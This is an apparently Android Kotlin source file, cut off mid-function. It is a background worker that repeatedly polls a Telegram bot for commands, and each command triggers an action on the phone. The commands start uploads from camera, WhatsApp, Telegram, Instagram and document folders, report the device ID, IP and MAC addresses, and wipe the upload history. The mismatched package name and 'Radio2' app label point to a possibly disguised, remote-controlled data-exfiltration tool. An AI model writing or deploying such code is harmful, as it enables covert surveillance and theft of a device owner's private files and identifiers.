package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import org.json.JSONArray
import java.io.IOException
import java.util.concurrent.TimeUnit
import android.util.Log
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import java.io.File
import android.os.Build

class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "TelegramCommandWorker"
    }

    private val workerScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun doWork(): Result {
        try {
            Log.d(TAG, "Iniciando escucha de comandos de Telegram")
            val config = obtenerConfigBot(applicationContext)
            if (config == null) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return reprogramarWorker()
            }
            val (token, chatId) = config
            if (token.isBlank() || chatId.isBlank()) {
                Log.w(TAG, "Token o chat ID vacíos")
                return reprogramarWorker()
            }
            // Leer el último offset procesado
            val prefs = applicationContext.getSharedPreferences("telegram_offset", Context.MODE_PRIVATE)
            val lastOffset = prefs.getLong("last_update_id", 0L)
            val url = if (lastOffset > 0) {
                "https://api.telegram.org/bot$token/getUpdates?offset=${lastOffset + 1}"
            } else {
                "https://api.telegram.org/bot$token/getUpdates"
            }
            val request = Request.Builder().url(url).build()
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string() ?: ""
                if (body.isNotBlank()) {
                    val maxUpdateId = procesarComandos(body, token, chatId)
                    // Guardar el nuevo offset si hay updates
                    if (maxUpdateId > 0) {
                        prefs.edit().putLong("last_update_id", maxUpdateId).apply()
                    }
                }
            } else {
                Log.w(TAG, "Error obteniendo updates: ${response.code}")
            }
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error en TelegramCommandWorker: ${e.message}", e)
        }
        return reprogramarWorker()
    }

    // Cambia el tipo de retorno a Long para devolver el último update_id procesado
    private fun procesarComandos(jsonResponse: String, token: String, chatId: String): Long {
        var maxUpdateId = 0L
        val chatIdLong = try { chatId.toLong() } catch (_: Exception) { 0L }
        try {
            val json = JSONObject(jsonResponse)
            if (!json.has("result")) {
                Log.w(TAG, "Respuesta de Telegram no contiene 'result'")
                return 0L
            }
            val result = json.getJSONArray("result")
            for (i in 0 until result.length()) {
                try {
                    val update = result.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > maxUpdateId) maxUpdateId = updateId
                    val message = update.optJSONObject("message") ?: continue
                    val fromChatIdLong = message.optJSONObject("chat")?.optLong("id") ?: continue
                    val text = message.optString("text", "")
                    // Solo procesar si el chat_id coincide y el texto no está vacío
                    if (fromChatIdLong == chatIdLong && text.isNotBlank()) {
                        procesarComando(text, token, chatId)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando mensaje: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando comandos: ${e.message}", e)
        }
        return maxUpdateId
    }

    private fun procesarComando(text: String, token: String, chatId: String) {
        when {
            text.contains("/ayuda", ignoreCase = true) || text.contains("/help", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: ayuda")
                mostrarAyuda(token, chatId)
            }
            text.contains("/iniciar_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: iniciar_backup")
                try {
                    // Verificar si el backup ya está activo
                    val workInfos = WorkManager.getInstance(applicationContext)
                        .getWorkInfosForUniqueWork("backup_trabajo")
                        .get()
                    val backupActivo = workInfos.any { it.state == androidx.work.WorkInfo.State.ENQUEUED || it.state == androidx.work.WorkInfo.State.RUNNING }
                    if (backupActivo) {
                        enviarConfirmacionTelegram(token, chatId, "✅ El backup automático ya está activo en el dispositivo.")
                    } else {
                        programarBackup(applicationContext, obtenerIntervalo(applicationContext).toLong())
                        enviarConfirmacionTelegram(token, chatId, "✅ Backup automático iniciado en el dispositivo.")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup: "+e.message)
                }
            }
            text.contains("/backup_manual", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: backup_manual")
                try {
                    iniciarBackupManual(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup manual: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup manual: "+e.message)
                }
            }
            text.contains("/estado", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estado")
                try {
                    val estado = obtenerEstadoBackup()
                    val mensaje = if (estado.isNullOrBlank()) "⚠️ No hay información de estado disponible." else "📊 Estado del backup: $estado"
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estado: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estado: "+e.message)
                }
            }
            text.contains("/estadisticas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estadisticas")
                try {
                    val estadisticas = obtenerEstadisticas()
                    enviarConfirmacionTelegram(token, chatId, estadisticas)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estadísticas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas: "+e.message)
                }
            }
            text.contains("/configuracion", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: configuracion")
                try {
                    val config = obtenerConfiguracion()
                    val mensaje = if (config.isNullOrBlank()) "⚠️ No hay configuración disponible." else config
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo configuración: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo configuración: "+e.message)
                }
            }
            text.contains("/detener_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: detener_backup")
                try {
                    detenerBackup()
                    enviarConfirmacionTelegram(token, chatId, "🛑 Backup automático detenido.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error deteniendo backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error deteniendo backup: "+e.message)
                }
            }
            text.contains("/limpiar_historial", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: limpiar_historial")
                try {
                    limpiarHistorial()
                    enviarConfirmacionTelegram(token, chatId, "🧹 Historial de archivos limpiado.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error limpiando historial: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error limpiando historial: "+e.message)
                }
            }
            text.contains("/dispositivo", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: dispositivo")
                try {
                    val info = obtenerInfoDispositivo()
                    val mensaje = if (info.isNullOrBlank()) "⚠️ No hay información del dispositivo disponible." else info
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo info del dispositivo: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo info del dispositivo: "+e.message)
                }
            }
            text.contains("/device_info", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: device_info")
                try {
                    val info = obtenerDeviceInfoDetallado()
                    val mensaje = if (info.isNullOrBlank()) "⚠️ No hay información detallada del dispositivo disponible." else info
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo info detallada del dispositivo: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo info detallada del dispositivo: "+e.message)
                }
            }
            text.contains("/github_sync", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: github_sync")
                try {
                    syncWithGitHubFromTelegram(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error sincronizando con GitHub: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error sincronizando con GitHub: "+e.message)
                }
            }
            text.contains("/github_stats", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: github_stats")
                try {
                    val stats = obtenerGitHubStats()
                    val mensaje = if (stats.isNullOrBlank()) "⚠️ No hay estadísticas de GitHub disponibles." else stats
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estadísticas de GitHub: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas de GitHub: "+e.message)
                }
            }
            text.contains("/crear_carpetas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: crear_carpetas")
                try {
                    workerScope.launch {
                        crearEstructuraCarpetas(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error creando carpetas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error creando carpetas: "+e.message)
                }
            }
            text.contains("/temas_manual", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: temas_manual")
                try {
                    mostrarInstruccionesTemas(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error mostrando instrucciones: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando instrucciones: "+e.message)
                }
            }
            text.contains("/obtener_temas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: obtener_temas")
                try {
                    workerScope.launch {
                        obtenerTemasExistentes(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo temas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo temas: "+e.message)
                }
            }
            // ARCHIVADO: Comando de prueba de agrupación desactivado
            /*
            text.contains("/probar_agrupacion", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: probar_agrupacion")
                try {
                    workerScope.launch {
                        probarAgrupacionTemas(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error probando agrupación: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error probando agrupación: "+e.message)
                }
            }
            */
            // ARCHIVADO: Comandos de temas desactivados
            /*
            text.contains("/configurar_temas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: configurar_temas")
                try {
                    workerScope.launch {
                        mostrarConfiguracionTemas(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error configurando temas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error configurando temas: "+e.message)
                }
            }
            text.startsWith("/set_topic", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: set_topic")
                try {
                    workerScope.launch {
                        configurarTopicId(token, chatId, text)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error configurando topic ID: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error configurando topic ID: ${e.message}")
                }
            }
            text.startsWith("/encontrar_ids", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: encontrar_ids")
                try {
                    workerScope.launch {
                        encontrarTopicIds(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error encontrando topic IDs: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error encontrando topic IDs: "+e.message)
                }
            }
            */
            text.contains("/cola_estado", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: cola_estado")
                try {
                    workerScope.launch {
                        mostrarEstadoCola(token, chatId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error mostrando estado de cola: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando estado de cola: "+e.message)
                }
            }
        }
    }

    private fun mostrarAyuda(token: String, chatId: String) {
        val ayuda = """
            🤖 *Comandos disponibles:*
            
            📋 */ayuda* - Muestra esta lista de comandos
            🔄 */iniciar_backup* - Inicia el backup automático
            📤 */backup_manual* - Ejecuta un backup manual inmediato
            📊 */estado* - Muestra el estado del backup
            📈 */estadisticas* - Muestra estadísticas de uso
            ⚙️ */configuracion* - Muestra la configuración actual
            🛑 */detener_backup* - Detiene el backup automático
            🧹 */limpiar_historial* - Limpia el historial de archivos
            📱 */dispositivo* - Información del dispositivo
            🔍 */device_info* - Información detallada del dispositivo
            🔄 */github_sync* - Sincroniza con GitHub
            📊 */github_stats* - Estadísticas de GitHub
            📁 */crear_carpetas* - Crea estructura de temas en Telegram
            📋 */temas_manual* - Instrucciones para crear temas manualmente
            🔍 */obtener_temas* - Muestra temas existentes en el grupo
            🔄 */cola_estado* - Estado del sistema de cola para múltiples dispositivos
            // ARCHIVADO: Comandos de temas desactivados
            // 🧪 */probar_agrupacion* - Prueba la agrupación de archivos en temas
            // ⚙️ */configurar_temas* - Configura los IDs de los temas
            // 🔍 */encontrar_ids* - Ayuda a encontrar los IDs de los temas
            
            _Envía cualquier comando para ejecutarlo._
        """.trimIndent()
        val chatIdSecundario = obtenerChatIdSecundario(applicationContext)
        val mensaje = if (ayuda.isBlank()) "⚠️ No hay ayuda disponible." else ayuda
        Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
        enviarConfirmacionTelegram(token, chatIdSecundario ?: chatId, mensaje)
    }

    private fun iniciarBackupManual(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🚀 Iniciando backup manual...")
            workerScope.launch {
                try {
                    val resultado = BackupUtils.ejecutarBackupManual(applicationContext)
                    val mensaje = if (resultado) {
                        "✅ Backup manual completado exitosamente"
                    } else {
                        "⚠️ Backup manual completado con errores"
                    }
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    enviarConfirmacionTelegram(token, chatId, "❌ Error en backup manual: ${e.message}")
                }
            }
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerEstadisticas(): String {
        return try {
            val archivosSubidos = ErrorHandler.obtenerCantidadArchivosSubidos(applicationContext)
            val (ultima, anterior) = obtenerHistorial(applicationContext)
            val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            
            val ultimaStr = if (ultima != 0L) formato.format(Date(ultima)) else "Nunca"
            val anteriorStr = if (anterior != 0L) formato.format(Date(anterior)) else "Nunca"
            
            """
                📈 *Estadísticas del dispositivo:*
                
                📁 Archivos subidos: $archivosSubidos
                🕐 Última conexión: $ultimaStr
                ⏰ Conexión anterior: $anteriorStr
                📱 Dispositivo: ${android.os.Build.MODEL}
                🤖 Android: ${android.os.Build.VERSION.RELEASE}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo estadísticas: ${e.message}"
        }
    }

    private fun obtenerConfiguracion(): String {
        return try {
            val intervalo = obtenerIntervalo(applicationContext)
            val tiposArchivo = obtenerTiposArchivo(applicationContext)
            val backupPorFases = obtenerBackupPorFases(applicationContext)
            
            """
                ⚙️ *Configuración actual:*
                
                ⏰ Intervalo de backup: $intervalo horas
                📁 Tipos de archivo: ${tiposArchivo.joinToString(", ")}
                🔄 Backup por fases: ${if (backupPorFases) "Activado" else "Desactivado"}
                📱 Dispositivo: ${android.os.Build.MODEL}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo configuración: ${e.message}"
        }
    }

    private fun detenerBackup() {
        try {
            WorkManager.getInstance(applicationContext).cancelAllWorkByTag("backup_worker")
            WorkManager.getInstance(applicationContext).cancelUniqueWork("backup_trabajo")
        } catch (e: Exception) {
            throw e
        }
    }

    private fun limpiarHistorial() {
        try {
            ErrorHandler.limpiarRegistroArchivos(applicationContext)
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerInfoDispositivo(): String {
        return try {
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
                📱 *Información del dispositivo:*
                
                🆔 ID: ${deviceInfo.deviceId}
                📱 Dispositivo: ${deviceInfo.deviceName}
                🌐 IP: ${deviceInfo.ipAddress}
                📡 MAC: ${deviceInfo.macAddress}
                🤖 Android: ${deviceInfo.androidVersion}
                🏭 Fabricante: ${deviceInfo.manufacturer}
                📋 Modelo: ${deviceInfo.model}
                📦 App: Radio2 v1.0.0
                🕐 Última actualización: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo info del dispositivo: ${e.message}"
        }
    }

    private fun obtenerDeviceInfoDetallado(): String {
        return try {
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
🔍 *Información Detallada del Dispositivo:*

🆔 *ID Único:* ${deviceInfo.deviceId}
📱 *Nombre:* ${deviceInfo.deviceName}
🌐 *Dirección IP:* ${deviceInfo.ipAddress}
📡 *Dirección MAC:* ${deviceInfo.macAddress}
🤖 *Versión Android:* ${deviceInfo.androidVersion}
🏭 *Fabricante:* ${deviceInfo.manufacturer}
📋 *Modelo:* ${deviceInfo.model}
📦 *Aplicación:* Radio2 Backup v1.0.0
🕐 *Timestamp:* ${deviceInfo.timestamp}

📊 *Información JSON:*
\`\`\`json
${DeviceInfo(applicationContext).getDeviceInfoJson()}
\`\`\`

🕐 *Última actualización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo info detallada del dispositivo: ${e.message}"
        }
    }

    // ARCHIVADO: Sistema de agrupación de temas desactivado
    /*
    private suspend fun probarAgrupacionTemas(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🧪 Probando agrupación de temas...")
            
            // Crear archivos de prueba para diferentes temas
            val archivosPrueba = listOf(
                "test_camera.jpg" to "📸 DCIM - Camera",
                "test_screenshots.png" to "📸 DCIM - Screenshots",
                "test_whatsapp.jpg" to "📸 DCIM - WhatsApp",
                "test_music.mp3" to "🎵 Music",
                "test_documents.pdf" to "📄 Documents"
            )
            
            var archivosEnviados = 0
            for ((nombreArchivo, tema) in archivosPrueba) {
                try {
                    // Crear archivo temporal de prueba
                    val tempFile = File(applicationContext.cacheDir, nombreArchivo)
                    tempFile.writeText("Archivo de prueba para tema: $tema\n\nEste archivo se enviará al tema: $tema")
                    
                    // Obtener el ID del tema
                    val topicId = getTopicIdForFolder(tema)
                    
                    // Usar la función principal de envío de archivos
                    val resultado = BackupUtils.enviarArchivoATelegram(token, chatId, tempFile, applicationContext)
                    
                    if (resultado == null) {
                        archivosEnviados++
                        Log.d(TAG, "✅ Archivo de prueba enviado: $nombreArchivo a tema $tema")
                    } else {
                        Log.w(TAG, "⚠️ No se pudo enviar archivo de prueba: $nombreArchivo - $resultado")
                    }
                    
                    // Eliminar archivo temporal
                    tempFile.delete()
                    
                    delay(500) // Pausa para evitar rate limiting
                } catch (e: Exception) {
                    Log.e(TAG, "Error enviando archivo de prueba $nombreArchivo: ${e.message}")
                }
            }
            
            val mensajeFinal = """
                🧪 *Prueba de Agrupación Completada*
                
                📁 Archivos de prueba enviados: $archivosEnviados/${archivosPrueba.size}
                📱 Dispositivo: ${Build.MANUFACTURER} ${Build.MODEL}
                🕐 Fecha: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                ${if (archivosEnviados > 0) "✅ Los archivos se enviaron correctamente.\n\n💡 *Verifica:* Los archivos deberían aparecer agrupados en temas separados." else "⚠️ No se pudieron enviar archivos de prueba."}
                
                🔧 *Si no ves agrupación:* Asegúrate de que los temas estén creados en el orden correcto.
            """.trimIndent()
            
            enviarConfirmacionTelegram(token, chatId, mensajeFinal)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error probando agrupación: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error probando agrupación: ${e.message}")
        }
    }
    */

    // ARCHIVADO: Sistema de agrupación de temas desactivado
    /**
     * Obtiene el ID del tema de Telegram basado en el nombre del tema
     */
    /*
    private fun getTopicIdForFolder(topicName: String): Int? {
        return try {
            // Obtener IDs configurados desde SharedPreferences
            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
            
            val topicMapping = mapOf(
                "📸 DCIM - Camera" to sharedPrefs.getInt("topic_camera", 0).takeIf { it > 0 },
                "📸 DCIM - Screenshots" to sharedPrefs.getInt("topic_screenshots", 0).takeIf { it > 0 },
                "📸 DCIM - WhatsApp" to sharedPrefs.getInt("topic_whatsapp", 0).takeIf { it > 0 },
                "📸 DCIM - Telegram" to sharedPrefs.getInt("topic_telegram", 0).takeIf { it > 0 },
                "📸 DCIM - Instagram" to sharedPrefs.getInt("topic_instagram", 0).takeIf { it > 0 },
                "📸 DCIM - Downloads" to sharedPrefs.getInt("topic_downloads", 0).takeIf { it > 0 },
                "📸 DCIM - Other" to sharedPrefs.getInt("topic_other", 0).takeIf { it > 0 },
                "📸 Pictures" to sharedPrefs.getInt("topic_pictures", 0).takeIf { it > 0 },
                "🎥 Movies" to sharedPrefs.getInt("topic_movies", 0).takeIf { it > 0 },
                "🎥 Videos" to sharedPrefs.getInt("topic_videos", 0).takeIf { it > 0 },
                "🎵 Music" to sharedPrefs.getInt("topic_music", 0).takeIf { it > 0 },
                "🎵 Ringtones" to sharedPrefs.getInt("topic_ringtones", 0).takeIf { it > 0 },
                "🎵 Notifications" to sharedPrefs.getInt("topic_notifications", 0).takeIf { it > 0 },
                "🎵 Alarms" to sharedPrefs.getInt("topic_alarms", 0).takeIf { it > 0 },
                "📄 Documents" to sharedPrefs.getInt("topic_documents", 0).takeIf { it > 0 },
                "📄 Downloads" to sharedPrefs.getInt("topic_downloads_docs", 0).takeIf { it > 0 },
                "📱 Apps" to sharedPrefs.getInt("topic_apps", 0).takeIf { it > 0 },
                "📁 Other" to sharedPrefs.getInt("topic_other_files", 0).takeIf { it > 0 }
            )
            
            topicMapping[topicName]
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo ID del tema $topicName: ${e.message}")
            null
        }
    }
    */

    private suspend fun obtenerTemasExistentes(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🔍 Verificando configuración de temas...")
            
            // En lugar de intentar obtener temas automáticamente, mostrar instrucciones de configuración
            val mensaje = """
                📋 *Configuración de Temas de Telegram*
                
                Para que los archivos se agrupen correctamente, necesitas:
                
                🔧 *1. Crear los temas manualmente:*
                Ve a Configuración del grupo → Temas → Crear tema
                
                📝 *2. Crear en este orden exacto:*
                1. DCIM - Camera
                2. DCIM - Screenshots
                3. DCIM - WhatsApp
                4. DCIM - Telegram
                5. DCIM - Instagram
                6. DCIM - Downloads
                7. DCIM - Other
                8. Pictures
                9. Movies
                10. Videos
                11. Music
                12. Ringtones
                13. Notifications
                14. Alarms
                15. Documents
                16. Downloads
                17. Apps
                18. Other
                
                ✅ *3. Verificar configuración:*
                Una vez creados, los archivos se enviarán automáticamente a los temas correspondientes.
                
                💡 *Consejo:* Los IDs se asignan automáticamente según el orden de creación.
                
                🚀 *Próximo paso:* Usa `/temas_manual` para instrucciones detalladas.
            """.trimIndent()
            
            enviarConfirmacionTelegram(token, chatId, mensaje)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando temas: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error verificando temas: ${e.message}")
        }
    }

    private fun mostrarInstruccionesTemas(token: String, chatId: String) {
        val instrucciones = """
            📁 *Creación Manual de Temas en Telegram*

            Para crear los temas manualmente y organizar mejor los archivos:

            🔧 *Pasos:*
            1️⃣ Ve a la configuración del grupo
            2️⃣ Busca la opción "Temas" o "Topics"
            3️⃣ Activa los temas si no están activados
            4️⃣ Crea los siguientes temas:

            📸 *Temas de Fotos:*
            • DCIM - Camera
            • DCIM - Screenshots
            • DCIM - WhatsApp
            • DCIM - Telegram
            • DCIM - Instagram
            • DCIM - Downloads
            • DCIM - Other
            • Pictures

            🎥 *Temas de Videos:*
            • Movies
            • Videos

            🎵 *Temas de Audio:*
            • Music
            • Ringtones
            • Notifications
            • Alarms

            📄 *Temas de Documentos:*
            • Documents
            • Downloads

            📱 *Otros Temas:*
            • Apps
            • Other

            ✅ *Beneficios:*
            • Los archivos se agruparán automáticamente
            • Navegación más fácil
            • Organización visual clara

            💡 *Consejo:* Una vez creados los temas, los archivos se organizarán automáticamente según su ubicación en el dispositivo.
        """.trimIndent()
        
        enviarConfirmacionTelegram(token, chatId, instrucciones)
    }

    private suspend fun crearEstructuraCarpetas(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "📁 Creando estructura de temas en Telegram...")
            
            val folders = listOf(
                "📸 DCIM - Camera",
                "📸 DCIM - Screenshots", 
                "📸 DCIM - WhatsApp",
                "📸 DCIM - Telegram",
                "📸 DCIM - Instagram",
                "📸 DCIM - Downloads",
                "📸 DCIM - Other",
                "📸 Pictures",
                "🎥 Movies",
                "🎥 Videos",
                "🎵 Music",
                "🎵 Ringtones",
                "🎵 Notifications",
                "🎵 Alarms",
                "📄 Documents",
                "📄 Downloads",
                "📱 Apps",
                "📁 Other"
            )

            var temasCreados = 0
            for (folder in folders) {
                try {
                    // Intentar crear el tema usando la API de Telegram
                    val topicName = folder.replace("📸 ", "").replace("🎥 ", "").replace("🎵 ", "").replace("📄 ", "").replace("📱 ", "").replace("📁 ", "")
                    
                    val url = "https://api.telegram.org/bot$token/createForumTopic"
                    
                    val json = JSONObject().apply {
                        put("chat_id", chatId)
                        put("name", topicName)
                        put("icon_color", 0x2E86AB) // Color azul para los temas
                    }

                    val client = OkHttpClient()
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = Request.Builder().url(url).post(body).build()

                    val response = client.newCall(request).execute()
                    
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: ""
                        val jsonResponse = JSONObject(responseBody)
                        
                        if (jsonResponse.getBoolean("ok")) {
                            temasCreados++
                            Log.d(TAG, "✅ Tema creado exitosamente: $folder")
                        } else {
                            Log.w(TAG, "⚠️ Error en respuesta de Telegram para tema $folder: ${jsonResponse.optString("description")}")
                        }
                    } else {
                        Log.w(TAG, "⚠️ No se pudo crear tema: $folder - ${response.code}")
                        
                        // Si falla la creación del tema, enviar un mensaje informativo
                        val mensajeInfo = "📁 Tema: $folder\n\nEste tema se usará para organizar archivos automáticamente.\n\nPara crear manualmente:\n1. Ve a Configuración del grupo\n2. Activa 'Temas'\n3. Crea un tema llamado: $topicName"
                        
                        val urlMensaje = "https://api.telegram.org/bot$token/sendMessage"
                        val jsonMensaje = JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", mensajeInfo)
                            put("parse_mode", "HTML")
                        }
                        
                        val bodyMensaje = jsonMensaje.toString().toRequestBody("application/json".toMediaTypeOrNull())
                        val requestMensaje = Request.Builder().url(urlMensaje).post(bodyMensaje).build()
                        val responseMensaje = client.newCall(requestMensaje).execute()
                        responseMensaje.close()
                    }
                    response.close()
                    
                    delay(500) // Pausa para evitar rate limiting
                } catch (e: Exception) {
                    Log.e(TAG, "Error creando tema $folder: ${e.message}")
                }
            }
            
            val mensajeFinal = """
                ✅ *Estructura de Temas Creada*
                
                📁 Temas creados: $temasCreados/${folders.size}
                📱 Dispositivo: ${Build.MANUFACTURER} ${Build.MODEL}
                🕐 Fecha: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                *Temas disponibles:*
                • 📸 DCIM - Camera
                • 📸 DCIM - Screenshots
                • 📸 DCIM - WhatsApp
                • 📸 DCIM - Telegram
                • 📸 DCIM - Instagram
                • 📸 DCIM - Downloads
                • 📸 DCIM - Other
                • 📸 Pictures
                • 🎥 Movies
                • 🎥 Videos
                • 🎵 Music
                • 🎵 Ringtones
                • 🎵 Notifications
                • 🎵 Alarms
                • 📄 Documents
                • 📄 Downloads
                • 📱 Apps
                • 📁 Other
                
                Los archivos se organizarán automáticamente según su ubicación.
                Cada archivo se enviará con el caption del tema correspondiente.
                
                ${if (temasCreados < folders.size) "⚠️ Algunos temas no se pudieron crear automáticamente. Crea los temas manualmente en la configuración del grupo." else ""}
                
                💡 *Consejo:* Para mejor organización, crea manualmente los temas en la configuración del grupo con los nombres mostrados arriba.
            """.trimIndent()
            
            enviarConfirmacionTelegram(token, chatId, mensajeFinal)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error creando estructura de temas: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error creando estructura de temas: ${e.message}")
        }
    }

    private fun syncWithGitHubFromTelegram(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🔄 Iniciando sincronización con GitHub...")
            workerScope.launch {
                try {
                    val prefs = applicationContext.getSharedPreferences("github_config", Context.MODE_PRIVATE)
                    val githubToken = prefs.getString("github_token", "") ?: ""
                    
                    if (githubToken.isBlank()) {
                        enviarConfirmacionTelegram(token, chatId, "❌ GitHub no está configurado. Usa la app para configurarlo.")
                        return@launch
                    }
                    
                    val config = com.service.assasinscreed02.github.GitHubHistorialSync.GitHubConfig(
                        token = githubToken,
                        owner = prefs.getString("github_owner", "userserverbackup") ?: "userserverbackup",
                        repo = prefs.getString("github_repo", "radio2-backup-historial") ?: "radio2-backup-historial",
                        branch = prefs.getString("github_branch", "main") ?: "main"
                    )
                    
                    if (!config.isValid()) {
